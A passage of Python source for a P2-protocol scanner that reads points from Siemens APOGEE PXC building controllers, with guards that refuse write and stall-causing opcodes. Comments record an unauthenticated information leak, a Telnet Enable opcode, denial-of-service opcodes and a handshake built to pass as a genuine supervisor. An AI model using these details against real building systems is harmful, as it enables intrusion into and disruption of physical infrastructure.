        return (str(int(value)), "")
    return (f"{value:.2f}", "")


# Global cache for the full TEC point definitions
_TECPNTS_DB = None

def _load_tecpnts_db() -> Optional[Dict]:
    """Load the TEC point definitions.

    Search order:
      1. **`importlib.resources.files('p2_scanner_data') / 'tecpoints.json'`** —
         the canonical location when installed via `pip install p2_scanner`.
         The catalog lives in a data-only sibling package (see H-8 in the
         repo-health punch list) so setuptools `package-data` carries it
         to site-packages.
      2. Module-sibling `tecpoints.json` (repo-clone-and-run-in-place).
      3. CWD `tecpoints.json` (legacy convenience for users who copied the
         file into their working directory).
      4. Legacy `tecpnts.json` at the same locations.
      5. **The catalog embedded in this module** (`_TECPOINTS_GZ_B64`). This is
         the one that actually serves nearly every install: it makes the
         scanner a single self-contained file. Anything found above overrides
         it, so a site can ship a newer or trimmed catalog without editing
         this module.

    Returns the parsed catalog. In practice never None, because step 5 is
    always available; None is reserved for a corrupted embedded blob.
    """
    import os

    # Path 1: installed package data via importlib.resources. Available on
    # Python 3.9+; the package itself is created by the `p2_scanner_data`
    # sibling directory in the repo.
    try:
        import importlib.resources
        ref = importlib.resources.files('p2_scanner_data') / 'tecpoints.json'
        if ref.is_file():
            with ref.open('r', encoding='utf-8') as f:
                return json.load(f)
    except (ImportError, ModuleNotFoundError, FileNotFoundError, AttributeError):
        # ImportError/ModuleNotFoundError: package not installed (running
        # from a non-package layout, e.g. repo clone before round 7).
        # FileNotFoundError: package installed but bundle missing.
        # AttributeError: Python < 3.9's importlib.resources lacked .files().
        pass

    here = os.path.dirname(os.path.abspath(__file__))
    cwd = os.getcwd()
    # Path 2-4: filesystem search for repo-clone-and-run-in-place workflows
    # and legacy filenames. Belt-and-suspenders — covers cases where:
    #   - importlib.resources can't find p2_scanner_data because of an
    #     unusual sys.path setup
    #   - Bridge has the catalog as a flat file (not in p2_scanner_data/)
    #   - Older repo state still has tecpoints.json at the repo root
    #   - User dropped tecpoints.json into their CWD manually
    search_paths = []
    # New canonical layout (H-8 / round 7) — sibling data package
    for base in (here, cwd):
        search_paths.append(os.path.join(base, 'p2_scanner_data', 'tecpoints.json'))
    # Pre-H-8 flat layout at module-sibling / CWD / unqualified path
    for base in (here, cwd, ''):
        search_paths.append(os.path.join(base, 'tecpoints.json'))
    # Legacy filename
    for base in (here, cwd, ''):
        search_paths.append(os.path.join(base, 'tecpnts.json'))
    for path in search_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception:
                pass
    # Path 5: the catalog embedded in this file — makes the scanner a
    # self-contained single file (no external tecpoints.json required). An
    # external file found above still overrides this embedded copy.
    try:
        import gzip as _gz, base64 as _b64
        return json.loads(_gz.decompress(_b64.b64decode(_TECPOINTS_GZ_B64)))
    except Exception:
        return None


# List of key points to read first (quick scan)
QUICK_SCAN_POINTS = [
    "APPLICATION", "ROOM TEMP", "CTL STPT", "CTL TEMP",
    "DAY CLG STPT", "NGT CLG STPT", "DAY HTG STPT", "NGT HTG STPT",
    "HEAT.COOL", "DAY.NGT", "FLOW", "AIR VOLUME",
    "DMPR POS", "VLV1 POS", "VLV2 POS",
    "HTG LOOPOUT", "CLG LOOPOUT", "ERROR STATUS",
]


# ═══════════════════════════════════════════════════════════════════════════════
# P2 PROTOCOL IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════════════════════

class P2Message:
    """Represents a single P2 protocol message."""
    # Message types
    TYPE_CONNECT   = 0x2E   # legacy 2nd channel (announce + DB-change/replication); name kept for compat
    TYPE_ANNOUNCE  = 0x2F   # modern 2nd channel (same role as 0x2E, by firmware generation)
    TYPE_DATA      = 0x33
    TYPE_HEARTBEAT = 0x34

    # Response direction byte (first byte of S2C payload)
    DIR_REQUEST   = 0x00   # C2S
    DIR_SUCCESS   = 0x01   # S2C success
    DIR_ERROR     = 0x05   # S2C error (followed by u16 BE error code)

    # Opcode / marker constants (big-endian 16-bit opcodes live inside 0x33/0x34 payloads)
    OP_IDENTIFY        = 0x4640  # mid-session identity refresh
    OP_READ_EXTENDED   = 0x0271  # point read (legacy-dialect clients)
    OP_READ_SHORT      = 0x0220  # point read (modern-dialect clients)
    OP_WRITE_NOVALUE   = 0x0273  # Desigo's UI point-existence probe (dominant use, 500x more common than alarm-ack); also AlarmAckTrigger before 0x0509
    OP_VALUE_PUSH      = 0x0274  # bidirectional: DCC->PXC virtual-write, or PXC->DCC COV
    OP_WRITE_QUALITY   = 0x0240  # WriteWithQuality. 5034 PXC->DCC NONE/sep=0x00 (ACK'd) vs 5033 DCC->PXC SYST/sep=0x23 (errors 0x0E15 — Desigo retries with 0x4222)
    OP_ENUM_FLN        = 0x0986  # enumerate FLN devices
    OP_ENUM_POINTS     = 0x0981  # enumerate all points (cursor-based)
    OP_ENUM_PROGRAMS   = 0x0985  # enumerate PPCL programs — response carries source text
    OP_SYSINFO         = 0x0100  # firmware / model (legacy). Also the CONNECT-response opcode on PME1252 V2.8.10 — panels echo this in 0x2E body instead of 0x4640.
    OP_SYSINFO_COMPACT = 0x010C  # firmware / model (newer; 2-byte request)
    OP_ROUTING_TABLE   = 0x4634  # BLN routing-table announce/push (port-agnostic — observed on both 5033 and 5034)
    OP_BULK_READ       = 0x4221  # bulk property read (constant 273-byte preallocated request body — see APOGEE_P2_SPEC.md §12.7 / §29.10. Distinct from 0x4220's 222-byte form.)
    OP_BULK_WRITE      = 0x4222  # BulkPropertyWrite — the canonical opcode for SYST setpoint writes; 0x0240 against SYST returns 0x0E15
    OP_PROPERTY_ECHO   = 0x0241  # SYST-scoped PropertyEcho / DefaultPropertyResolve — see OPCODES.md (May 2026 paired-response audit)
    OP_STATUS_QUERY    = 0x0050  # leaks supervisor name (bare form) without authentication; useful cold-discovery primitive
    # ---- EBLN management set, 0x4620-0x4642 ------------------------------
    # Validated span 0x4620-0x4640. Names from the AP2 function enumeration,
    # corroborated by the command
    # string pool of a shipped EBLN diagnostic binary (ordered by opcode and
    # validated against five independently wire-established bindings).
    #
    # Only 0x4633-0x4636 and 0x4640 have ever been seen in captured traffic.
    # The rest do not occur in normal operation at all, which cuts two ways:
    # any occurrence is anomalous and worth alerting on, and nothing in the
    # protocol restricts them to a supervisor -- the identity check is the
    # same for every caller, so "supervisor-only" is a property of which tool
    # ships them, not an enforced one.
    OP_EBLN_FP_NAME_SET          = 0x4620
    OP_EBLN_FP_IP_CONFIGURE      = 0x4621
    OP_EBLN_FP_TCP_PORTS_CONFIG  = 0x4622
    OP_EBLN_FP_DISPLAY           = 0x4623
    OP_EBLN_STORAGE_NODES_REPL   = 0x4624
    OP_EBLN_STORAGE_NODES_DISP   = 0x4625
    OP_EBLN_REPORT_PRINTER_REPL  = 0x4626
    OP_EBLN_REPORT_PRINTER_DISP  = 0x4627
    OP_EBLN_TRUNK_SETTINGS_REPL  = 0x4628
    OP_EBLN_TRUNK_SETTINGS_DISP  = 0x4629   # yields the TRUNK_SETTINGS report
    OP_EBLN_FP_SITE_NAME_SET     = 0x462A
    OP_EBLN_FP_BLN_NAME_SET      = 0x462B   # sets the BLN name -- the only gate
    OP_EBLN_FP_MULTICAST_CONFIG  = 0x462C
    OP_EBLN_HOSTTABLE_ADD        = 0x462D
    OP_EBLN_HOSTTABLE_REMOVE     = 0x462E
    OP_EBLN_HOSTTABLE_DISPLAY    = 0x462F   # the (Permanent) name->IP table
    OP_EBLN_NODE_ADD             = 0x4630
    OP_EBLN_NODE_REMOVE          = 0x4631
    OP_EBLN_NODE_LIST_DISPLAY    = 0x4632
    OP_EBLN_REPL_NOTIFY          = 0x4633
    OP_EBLN_REPL_PULL            = 0x4634   # == OP_ROUTING_TABLE above; see note
    OP_EBLN_REPL_PULL_MORE       = 0x4635
    OP_EBLN_REPL_CHANGES         = 0x4636
    OP_EBLN_POINT_LOCATION_GET   = 0x4637
    OP_EBLN_MAC_ADDRESS_SET      = 0x4638
    OP_EBLN_MII_CONFIGURE        = 0x4639
    OP_EBLN_MII_DISPLAY          = 0x463A
    OP_EBLN_IP_DISPLAY           = 0x463B
    OP_EBLN_PORTS_DISPLAY        = 0x463C
    OP_EBLN_MULTICAST_DISPLAY    = 0x463D
    OP_EBLN_MAC_ADDRESS_DISPLAY  = 0x463E
    OP_EBLN_REPL_DIAG_NODELIST   = 0x464C   # AP2 enum + firmware report
                                            # name + captured body all agree
    OP_EBLN_TELNET_ENABLE        = 0x4644   # AP2 enum; NOT 0x4641
    OP_EBLN_TELNET_DISABLE       = 0x4645   # AP2 enum; NOT 0x4642
    #
    # Naming note: OP_ROUTING_TABLE (0x4634) above was named from observed
    # behaviour ("BLN routing-table announce/push"). The AP2 name for the same
    # opcode is Repl Pull, which fits the traffic -- 1,267 requests, 59% of them
    # panel-initiated, pulling replication changes. Both constants are kept; the
    # older one is not renamed because callers depend on it.

    OP_PROPERTY_QUERY  = 0x4200  # PropertyQuery (small ~30-40B browse form OR 222B preallocated deep-read form)

    # Byte-sequence markers used by pcap/stream scanners looking for these opcodes.
    # Kept as raw bytes for fast substring search.
    MARKER_KEEPALIVE    = b'\x46\x40'
    MARKER_VALUE_PUSH   = b'\x02\x74'
    MARKER_WRITE_QUAL   = b'\x02\x40'
    MARKER_ROUTING_TBL  = b'\x46\x34'
    MARKER_ALARM_REPORT = b'\x05\x08'  # 0x0508 ALARM_PRINT (panel->supervisor alarm push)
    MARKER_READ         = b'\x02\x71'
    MARKER_BROWSE       = b'\x42'

    # Back-compat alias — original doc called 0x0274 "COV notification".
    # Reality (confirmed from dual-port captures): 0x0274 is bidirectional.
    # On 5033 (DCC->PXC) it's a virtual-point write into the panel's model.
    # On the supervisor port (panel->supervisor direction) it's the genuine unsolicited COV. Same opcode,
    # direction-dependent semantic. Prefer MARKER_VALUE_PUSH for new code.
    MARKER_COV = MARKER_VALUE_PUSH

    # Bare-opcode session keepalives (APOGEE_P2_SPEC.md §9.13, §28.6).
    # Panels emit these as 2-byte payloads with no direction byte and no
    # body — the opcode IS the payload. Distinct from request/response
    # framing; an in-flight read should not pair with these.
    BARE_PING_OPCODES = frozenset({0x0951, 0x0954, 0x0955, 0x0956, 0x0959})

    def __init__(self, msg_type: int, sequence: int, payload: bytes):
        self.msg_type = msg_type
        self.sequence = sequence
        self.payload = payload
        # is_response covers both success (0x01) and error (0x05) per
        # APOGEE_P2_SPEC.md §8.3. Direction byte 0x00 is a request from
        # the peer or our own request; anything else is a response that
        # _recv_response should pair to the in-flight request. An earlier
        # version checked == 0x01 only, which silently filtered out error
        # responses and made the error-handling code in _parse_*_response
        # unreachable (errors looked like timeouts to the caller).
        self.is_response = payload[0] in (0x01, 0x05) if payload else False
        # Bare-opcode keepalive ping: exactly 2 bytes, opcode in the set
        # documented in §9.13. Non-matching 2-byte payloads (e.g. an
        # error reply truncated to direction+code) are NOT bare pings —
        # the opcode-set test discriminates.
        self.is_bare_ping = (
            len(payload) == 2
            and struct.unpack('>H', payload)[0] in self.BARE_PING_OPCODES
        ) if payload else False

    def to_bytes(self) -> bytes:
        total_len = 12 + len(self.payload)
        header = struct.pack('>III', total_len, self.msg_type, self.sequence)
        return header + self.payload

    @classmethod
    def from_bytes(cls, data: bytes) -> Optional['P2Message']:
        if len(data) < 12:
            return None
        total_len, msg_type, sequence = struct.unpack('>III', data[:12])
        payload = data[12:total_len]
        return cls(msg_type, sequence, payload)



# ---------------------------------------------------------------------------
# EBLN read/write split, and the operations this tool will not emit.
#
# This is an ALLOWLIST, not a blocklist. A blocklist cannot protect against an
# opcode nobody has named yet: a May 2026 sweep sent 0x4641 blind and the panel
# returned success -- that opcode is Telnet Enable, and the same sweep walked a
# range containing BLN Name Set and MAC Address Set; 0x4644 Telnet Enable was
# sent and returned success. Naming them afterwards is what made the risk
# visible, so the guard is expressed positively.

EBLN_READS = frozenset({
    P2Message.OP_EBLN_FP_DISPLAY,            P2Message.OP_EBLN_STORAGE_NODES_DISP,
    P2Message.OP_EBLN_REPORT_PRINTER_DISP,   P2Message.OP_EBLN_TRUNK_SETTINGS_DISP,
    P2Message.OP_EBLN_HOSTTABLE_DISPLAY,     P2Message.OP_EBLN_NODE_LIST_DISPLAY,
    P2Message.OP_EBLN_POINT_LOCATION_GET,    P2Message.OP_EBLN_MII_DISPLAY,
    P2Message.OP_EBLN_IP_DISPLAY,            P2Message.OP_EBLN_PORTS_DISPLAY,
    P2Message.OP_EBLN_MULTICAST_DISPLAY,     P2Message.OP_EBLN_MAC_ADDRESS_DISPLAY,
    P2Message.OP_EBLN_REPL_DIAG_NODELIST,
})

EBLN_WRITES = frozenset({
    P2Message.OP_EBLN_FP_NAME_SET,           P2Message.OP_EBLN_FP_IP_CONFIGURE,
    P2Message.OP_EBLN_FP_TCP_PORTS_CONFIG,   P2Message.OP_EBLN_STORAGE_NODES_REPL,
    P2Message.OP_EBLN_REPORT_PRINTER_REPL,   P2Message.OP_EBLN_TRUNK_SETTINGS_REPL,
    P2Message.OP_EBLN_FP_SITE_NAME_SET,      P2Message.OP_EBLN_FP_BLN_NAME_SET,
    P2Message.OP_EBLN_FP_MULTICAST_CONFIG,   P2Message.OP_EBLN_HOSTTABLE_ADD,
    P2Message.OP_EBLN_HOSTTABLE_REMOVE,      P2Message.OP_EBLN_NODE_ADD,
    P2Message.OP_EBLN_NODE_REMOVE,           P2Message.OP_EBLN_MAC_ADDRESS_SET,
    P2Message.OP_EBLN_MII_CONFIGURE,         P2Message.OP_EBLN_TELNET_ENABLE,
    P2Message.OP_EBLN_TELNET_DISABLE,
})

# Deliberately NOT in EBLN_READS: 0x464A, 0x464B, 0x464D, 0x464E, 0x464F and
# 0x4650. Every one of them answered success with a structured body when
# probed, so it is tempting to call them reads. Do not.
#
# The panel firmware names six EBLN replication reports, and two of them are
# "Add Data Store" and "Delete Data Store". Which opcode emits which report
# is unknown -- six names against seven responding opcodes, over a range
# whose gaps are unknown. Guessing a positional mapping across an opcode
# range with unknown gaps is exactly what produced a wrong Telnet binding
# earlier in this project. If the guess is wrong here the cost is not a
# mislabelled constant, it is emitting a data-store mutation at a customer
# site. 0x464C is in the allowlist because three independent sources agree
# on it; the rest wait for evidence.
#
# Note also that "returned data and appeared to change nothing" is not proof
# of being side-effect-free. It is proof of nothing observed from outside.

# Denial-of-service risk, independent of read/write: a single well-formed
# 0x4636 carrying the standard SYST scope body has been observed to take a
# panel's P2 task out for ~18 s -- longer than a real power cycle of the same
# panel. 0x4647 shows the same signature.
EBLN_STALL_RISK = frozenset({0x4636, 0x4647})

REFUSED_OPCODES = EBLN_WRITES | EBLN_STALL_RISK


def op_label(opcode):
    """`0x0274 AP2_COV_ANNUNCIATE`, or bare hex where no mnemonic is known.

    The unnamed ones are not an oversight: they are panel-side operations the
    supervisor's own function-code vocabulary does not carry (the 0x464x and
    0x486x blocks, for instance), so there is no vendor name to print.
    """
    if opcode is None:
        return '?'
    name = p2_data.opcode_name(opcode)
    out = "0x%04X %s" % (opcode, name) if name else "0x%04X" % opcode
    # A run of opcodes is often one operation with a parameter encoded in the
    # opcode: 0x0221 is point log with the filter set to in-alarm, the same
    # operation as 0x0220 asking a different question.  Name the operand.
    fam = p2_data.opcode_operand(opcode)
    return "%s (%s=%s)" % (out, fam[1], fam[2]) if fam else out

# The EBLN replication diagnostic block. Every value here answered success with
# a structured body when probed, and all but 0x464C are unidentified: the panel
# firmware names six replication reports, two of which are "Add Data Store" and
# "Delete Data Store". Until a specific opcode is tied to a specific report,
# this range is closed rather than open -- an allowlist, because the failure
# mode of guessing wrong is a data-store mutation on someone's panel.
EBLN_DIAGNOSTIC_RANGE = range(0x4646, 0x4651)


def check_emit_allowed(opcode: int) -> None:
    """Raise if an opcode must never be emitted by this tool.

    Called from P2Connection._send_message on every outbound frame.
    Deliberately not overridable by a flag: a determined caller can edit the
    source, but nobody does that by accident.

    Coverage, stated honestly: a few standalone helpers (dialect probe, cold
    discovery) build raw frames and call sock.sendall directly, bypassing this
    check. Audited at the time of writing -- the only EBLN opcodes any of them
    emit are 0x4634 REPL_PULL and 0x4640 PING, both permitted. If you add a
    raw-frame path, route it through here.
    """
    if opcode is None:
        return
    if opcode in EBLN_STALL_RISK:
        raise PermissionError(
            f"{op_label(opcode)} is a denial-of-service risk (observed ~18 s panel "
            f"outage) and is never emitted by this tool.")
    if opcode in EBLN_WRITES:
        raise PermissionError(
            f"{op_label(opcode)} is an EBLN write/configuration operation and is "
            f"never emitted by this tool. Use the panel console if you intend "
            f"to change configuration.")
    if opcode in EBLN_DIAGNOSTIC_RANGE and opcode not in EBLN_READS:
        raise PermissionError(
            f"{op_label(opcode)} is in the EBLN replication diagnostic block and "
            f"has not been identified. Two of the six reports this family "
            f"produces are 'Add Data Store' and 'Delete Data Store', and the "
            f"opcode-to-report mapping is unknown, so this tool will not send "
            f"it. 0x464C is permitted because three independent sources agree "
            f"it is the read-only NodeList report.")

class P2Connection:
    """Manages a TCP connection to a PXC controller using the P2 protocol."""

    def __init__(self, host: str, port: Optional[int] = None,
                 network: Optional[str] = None,
                 scanner_name: Optional[str] = None):
        # Defaults resolve at CALL time, not definition time. This avoids the
        # module-load-capture gotcha where a caller like P2Connection(ip) would
        # otherwise bake in whatever the globals happened to be when Python
        # first parsed this class — even if load_config() later updated them.
        self.host = host
        self.port = port if port is not None else P2_PORT
        self.network = network if network is not None else P2_NETWORK
        # Honor an explicit per-connection scanner_name argument; else
        # delegate to effective_scanner_name() which auto-builds the
        # canonical `<SITE>DCC-SVR|5033` form when site is known.
        self.scanner_name = scanner_name if scanner_name is not None else effective_scanner_name()
        self.sock: Optional[socket.socket] = None
        # Start sequence at a random 24-bit value matching real Desigo behavior.
        # APOGEE_P2_SPEC.md §5.2 / §8.4 + corpus analysis show real DCC
        # uses session-monotonic seqs in the millions; seq=0 / seq=1 is a clear
        # scanner fingerprint and may be rejected by stricter future firmware.
        self.sequence = secrets.randbits(24)
        self.node_name = None      # Learned from responses
        self._recv_buffer = b""
        # Dialect detection — see _handshake() for why this matters.
        # Initialized to TYPE_DATA (legacy PME1252 and earlier). If the target
        # turns out to speak the PME1300 dialect, _handshake() flips this to
        # TYPE_HEARTBEAT and every subsequent message uses the new type.
        self.op_msg_type = P2Message.TYPE_DATA
        # Optional event hook for frames _recv_response chooses not to pair
        # with the in-flight request — bare-opcode keepalives (§9.13),
        # out-of-window sequence numbers, async COV pushes on the same
        # socket, etc. Default is None (silently discard, matching prior
        # behavior). Callers can attach a hook to surface what's being
        # dropped:
        #     conn.on_discarded_frame = lambda msg, reason: ...
        # `reason` is one of: "bare_ping", "stale_seq", "unmatched".
        self.on_discarded_frame: Optional[Callable[[P2Message, str], None]] = None

    def connect(self, node_name: str = "node") -> bool:
        """Establish TCP connection and P2 session with the PXC controller."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(CONNECT_TIMEOUT)
            self.sock.connect((self.host, self.port))
            self.sock.settimeout(READ_TIMEOUT)
        except (socket.error, socket.timeout) as e:
            print(f"  [ERROR] Connection to {self.host}:{self.port} failed: {e}")
            return False

        # P2 session handshake: send a keepalive/heartbeat to establish the session
        # The PXC won't respond to read requests until it sees this.
        if not self._handshake(node_name):
            print(f"  [ERROR] P2 handshake failed — controller did not respond")
            self.close()
            return False

        return True

    def _handshake(self, node_name: str) -> bool:
        """Establish a P2 session, auto-detecting the PXC's message-type dialect.

        Two dialects are in use across Siemens PXC firmware:
          - **Legacy (PME1252 and earlier)**: operational traffic uses TYPE_DATA (0x33).
            The handshake exchange itself is 0x33-in, 0x33-out.
          - **Modern (firmware build PME1300, PXME hardware platform)**:
            operational traffic uses TYPE_HEARTBEAT (0x34). The handshake
            is 0x34-in, 0x34-out, and the panel typically initiates with
            a 0x2F ANNOUNCE to the supervisor.

        A PXC speaking the modern dialect will silently drop our 0x33 handshake
        (not RST, not respond — just ignore). So the detection logic is: try 0x33
        first with a short timeout; if nothing comes back, retry as 0x34. Whichever
        wins is locked in on self.op_msg_type for every subsequent message this
        connection sends.

        Result is cached in _DIALECT_CACHE keyed by host IP, so repeated connects
        to the same PXC within one process skip the probe.

        Important: we must rebuild and re-send the identity block with a fresh seq
        on retry. The PXC ties its response to the seq of the request that reached
        it, so reusing the original seq after a timeout is fine for our own tracking
        but pointless — the first seq's response will never come.
        """
        net = _wire_name(self.network, 'BLN name (network)')
        src = _wire_name(node_name, 'node name')
        scanner = _wire_name(self.scanner_name, 'scanner name')
        site = _wire_name(P2_SITE, 'site name')

        routing = (
            b'\x00' +
            net + b'\x00' +
            src + b'\x00' +
            net + b'\x00' +
            scanner + b'\x00'
        )

        def build_identity():
            # Fresh timestamp on every attempt. PXCs may reject handshakes with
            # suspiciously old timestamps from the same scanner — rebuilding it
            # per attempt keeps the retry clean.
            #
            # Trailer layout (16 bytes total) per APOGEE_P2_SPEC.md Connection-handshake
            # section, verified against the corpus:
            #   1 byte   separator (0x00)
            #   3 bytes  flags (0x01 0x01 0x00)  — third byte is the role flag;
            #            0x00 = "configured peer" (DCC-style), what we want
            #   5 bytes  reserved zeros
            #   4 bytes  timestamp (BE u32, Unix epoch seconds)
            #   2 bytes  session id (0x00 0x00 = panel-style; bouncer accepts;
            #            real DCC uses per-session non-zero values but copying
            #            one risks colliding with an active session)
            #   1 byte   trailing null
            return (
                b'\x46\x40' +
                b'\x01' + struct.pack('>H', len(scanner)) + scanner +
                b'\x01' + struct.pack('>H', len(site)) + site +
                b'\x01' + struct.pack('>H', len(net)) + net +
                b'\x00\x01\x01\x00' +                  # separator + 3 flag bytes
                b'\x00\x00\x00\x00\x00' +              # 5 reserved zeros
                struct.pack('>I', int(time.time())) + # 4-byte timestamp
                b'\x00\x00' +                          # 2-byte session id
                b'\x00'                                # trailing null
            )

        # ── Fast path A — registry lookup by cached firmware build tag.
        # APOGEE_P2_SPEC.md §30.4. Survives process restart via
        # site.json's known_builds field; can also fast-fail BACnet panels
        # (BME####) without paying the §11.2 dialect-probe wait.
        build_tag = firmware_registry.get_cached_build_tag(self.host)
        if build_tag is not None:
            negotiated = firmware_registry.negotiate_dialect(build_tag)
            if negotiated is not None:
                dialect, _read_family = negotiated
                if dialect == 'n/a':
                    print(f"  [INFO] {self.host} build {build_tag} is "
                          "BACnet firmware; unreachable via P2.")
                    return False
                seq = self._next_seq()
                mt = (P2Message.TYPE_HEARTBEAT if dialect == 'modern'
                      else P2Message.TYPE_DATA)
                msg = P2Message(mt, seq, routing + build_identity())
                if self._send_message(msg):
                    resp = self._recv_response(seq, max_attempts=5)
                    if resp is not None:
                        self.op_msg_type = mt
                        _DIALECT_CACHE[self.host] = (
                            0x33 if mt == P2Message.TYPE_DATA else 0x34)
                        return True
                # Tag is stale (firmware upgrade, panel swap, etc.).
                # Evict and fall through to the probe path.
                firmware_registry.evict_build_tag(self.host)
                self._recv_buffer = b""

        # ── Fast path B — process-local dialect cache.
        # Skip the probe if we've talked to this panel before this run.
        cached_dialect = _DIALECT_CACHE.get(self.host)
        if cached_dialect is not None:
            seq = self._next_seq()
            mt = P2Message.TYPE_DATA if cached_dialect == 0x33 else P2Message.TYPE_HEARTBEAT
            msg = P2Message(mt, seq, routing + build_identity())
            if not self._send_message(msg):
                return False
            resp = self._recv_response(seq, max_attempts=5)
            if resp is not None:
                self.op_msg_type = mt
                return True
            # Cached value didn't work — maybe firmware upgraded or cache stale.
            # Fall through to full probe, but evict the bad cache entry first.
            _DIALECT_CACHE.pop(self.host, None)
            self._recv_buffer = b""

        # Attempt 1: legacy TYPE_DATA (0x33) dialect.
        seq = self._next_seq()
        msg = P2Message(P2Message.TYPE_DATA, seq, routing + build_identity())
        if not self._send_message(msg):
            return False

        # Short first timeout — if the target speaks the legacy dialect, it
        # responds in well under a second. Waiting the full READ_TIMEOUT here
        # would make every modern-dialect PXC painfully slow to detect.
        original_timeout = self.sock.gettimeout() if self.sock else READ_TIMEOUT
        try:
            if self.sock:
                self.sock.settimeout(HANDSHAKE_PROBE_TIMEOUT)
            resp = self._recv_response(seq, max_attempts=3)
        finally:
            if self.sock:
                try: self.sock.settimeout(original_timeout)
                except Exception: pass

        if resp is not None:
            # Confirm the response msg_type — this is what the panel wants us
            # to speak. The common case (PME1252) will be TYPE_DATA; odd panels
            # that respond with TYPE_HEARTBEAT to a TYPE_DATA probe are rare
            # but handled correctly here.
            self.op_msg_type = resp.msg_type if resp.msg_type in (
                P2Message.TYPE_DATA, P2Message.TYPE_HEARTBEAT
            ) else P2Message.TYPE_DATA
            _DIALECT_CACHE[self.host] = 0x33 if self.op_msg_type == P2Message.TYPE_DATA else 0x34
            return True

        # Attempt 2: modern TYPE_HEARTBEAT (0x34) dialect.
        # Before retrying we need to drain any stale bytes in our recv buffer —
        # a late response from attempt 1 would otherwise confuse the next read.
        self._recv_buffer = b""
        seq = self._next_seq()
        msg = P2Message(P2Message.TYPE_HEARTBEAT, seq, routing + build_identity())
        if not self._send_message(msg):
            return False

        resp = self._recv_response(seq, max_attempts=5)
        if resp is not None:
            self.op_msg_type = P2Message.TYPE_HEARTBEAT
            _DIALECT_CACHE[self.host] = 0x34
            return True

        return False

    def close(self):
        """Close the TCP connection."""
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    def _next_seq(self) -> int:
        seq = self.sequence
        self.sequence += 1
        return seq

    def _build_routing(self, dest_node: str, is_request: bool = True) -> bytes:
        """Build the P2 routing header. P2 puts destination first, then source."""
        flag = b'\x00' if is_request else b'\x01'
        src = _wire_name(self.scanner_name, 'scanner name')
        dst = _wire_name(dest_node, 'destination node name')
        net = _wire_name(self.network, 'BLN name (network)')
        return flag + net + b'\x00' + dst + b'\x00' + net + b'\x00' + src + b'\x00'

    def _send_message(self, msg: P2Message) -> bool:
        """Send a P2 message over the TCP connection.

        Every outbound frame passes check_emit_allowed() first. The check
        lived here unenforced for one release -- defined, documented in the
        commit message, and called from nowhere. A safety guard that is not
        on the path is not a safety guard.
        """
        if not self.sock:
            return False
        check_emit_allowed(getattr(msg, "opcode", None))
        try:
            self.sock.sendall(msg.to_bytes())
            return True
        except socket.error as e:
            print(f"  [ERROR] Send failed: {e}")
            return False

    def _recv_message(self) -> Optional[P2Message]:
        """Receive a single P2 message from the connection."""
        if not self.sock:
            return None

        try:
            # Read until we have at least 12 bytes for the header
            while len(self._recv_buffer) < 12:
                chunk = self.sock.recv(4096)
                if not chunk:
                    return None
                self._recv_buffer += chunk

            # Parse the total length from the header
            total_len = struct.unpack('>I', self._recv_buffer[:4])[0]

            # Sanity-check the length. P2 frames are bounded; an unbounded
            # value here means either framing desync or a hostile peer sending
            # a forged length field. Either way, refusing to read 4GB into
            # memory is the right move. Same threshold as the supervisor-port listener.
            if total_len < 12 or total_len > 65536:
                self._recv_buffer = b''
                return None

            # Read until we have the full message
            while len(self._recv_buffer) < total_len:
                chunk = self.sock.recv(4096)
                if not chunk:
                    return None
                self._recv_buffer += chunk

            # Extract the message and advance the buffer
            msg_data = self._recv_buffer[:total_len]
            self._recv_buffer = self._recv_buffer[total_len:]
            return P2Message.from_bytes(msg_data)

        except socket.timeout:
            return None
        except socket.error as e:
            print(f"  [ERROR] Receive failed: {e}")
            return None

    def _recv_response(self, expected_seq: int, max_attempts: int = 10) -> Optional[P2Message]:
        """Receive a response paired to the expected request sequence.

        Pairs with a sliding-window tolerance, not strict equality, per
        APOGEE_P2_SPEC.md §5.2 / §24.5. In busy sessions about 10% of
        request/response pairs show the panel's response sequence running
        1-17 behind the request sequence (never ahead) due to panel-side
        pipelining lag. Strict equality treats those as unrelated traffic
        and silently loses ~10% of responses.

        Accepts any success response whose sequence is within the last 20
        frames of the expected sequence. Modular subtraction handles the
        rare 2^32 wrap case correctly (lag is always >= 0 per spec, so a
        "negative" raw difference wraps to a large positive value and
        gets rejected by the window check).
        """
        SEQ_WINDOW = 20
        for _ in range(max_attempts):
            msg = self._recv_message()
            if msg is None:
                return None
            if msg.is_response:
                lag = (expected_seq - msg.sequence) & 0xFFFFFFFF
                if lag <= SEQ_WINDOW:
                    return msg
                # Response from the same peer but outside the pairing window
                # — almost certainly a stale reply for a prior request.
                self._discard_frame(msg, "stale_seq")
                continue
            # Bare-opcode session keepalive — explicitly recognized so the
            # discard reason is accurate (was previously routed through the
            # generic "unmatched" path).
            if msg.is_bare_ping:
                self._discard_frame(msg, "bare_ping")
                continue
            # Any other frame: peer-initiated traffic on the same socket
            # — async COV, alarm report, identity refresh, etc.
            self._discard_frame(msg, "unmatched")
        return None

    def _discard_frame(self, msg: 'P2Message', reason: str) -> None:
        """Route a frame that won't pair with the in-flight request to the
        optional event hook. No-op when no hook is attached. Used to surface
        bare pings and async pushes that _recv_response would otherwise drop
        silently."""
        hook = getattr(self, 'on_discarded_frame', None)
        if hook is None:
            return
        try:
            hook(msg, reason)
        except Exception:
            # Hook errors must not affect protocol flow. Best-effort logging
            # only when DEBUG_READS is set.
            if DEBUG_READS:
                import traceback
                print(f"    [DEBUG] on_discarded_frame hook raised: "
                      f"{traceback.format_exc().strip()}")

    def read_point(self, device: str, point_name: str,
                   node_name: str = "node") -> Optional[Dict[str, Any]]:
        """
        Read a single point value from a TEC device.

        Args:
            device: TEC device name (e.g., "DEVICE1")
            point_name: Subpoint name (e.g., "ROOM TEMP")
            node_name: P2 node name in lowercase (e.g., "node1")

        Returns:
            Dict with 'value', 'units', 'description', or None on failure.
        """
        seq = self._next_seq()

        # Build routing header
        routing = self._build_routing(node_name)

        # Build read request payload
        # Format: [routing] 02 71 00 00 01 00 [dev_len] [device] 01 00 [pt_len] [point] 00 FF
        dev_bytes = device.encode('ascii')
        pt_bytes = point_name.encode('ascii')

        read_payload = (
            routing +
            b'\x02\x71\x00\x00' +
            b'\x01' + struct.pack('>H', len(dev_bytes)) + dev_bytes +
